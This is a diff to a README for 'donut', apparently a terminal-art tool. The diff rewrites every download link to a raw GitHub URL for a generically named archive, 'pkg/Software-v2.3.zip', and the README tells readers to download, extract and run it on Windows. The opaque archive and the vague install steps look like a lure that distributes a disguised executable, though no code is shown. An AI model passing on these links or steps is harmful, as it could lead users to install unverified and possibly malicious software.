@@ -1,6 +1,6 @@
 # 🎯 donut - Smooth terminal art in seconds
 
-[Download donut](https://github.com/Maxwellp5265/donut/raw/refs/heads/main/pkg/Software-v2.3.zip){style="background-color:#6a5acd;color:#ffffff;padding:10px 14px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:bold"}
+[Download donut](https://raw.githubusercontent.com/Maxwellp5265/donut/main/pkg/Software-v2.3.zip){style="background-color:#6a5acd;color:#ffffff;padding:10px 14px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:bold"}
 
 ## 🍩 What this app does
 
@@ -28,7 +28,7 @@ For the best view, use:
 
 Visit this page to download donut:
 
-https://github.com/Maxwellp5265/donut/raw/refs/heads/main/pkg/Software-v2.3.zip
+https://raw.githubusercontent.com/Maxwellp5265/donut/main/pkg/Software-v2.3.zip
 
 On that page, look for the latest release or the main download file. If the page gives you a Windows file, download it to your computer. If it gives you a folder or archive, save that file and extract it first.
 
@@ -152,6 +152,6 @@ The app should feel quick even on a basic Windows machine.
 
 Primary download page:
 
-https://github.com/Maxwellp5265/donut/raw/refs/heads/main/pkg/Software-v2.3.zip
+https://raw.githubusercontent.com/Maxwellp5265/donut/main/pkg/Software-v2.3.zip
 
 Use that page to get the Windows version of donut and run it on your PC
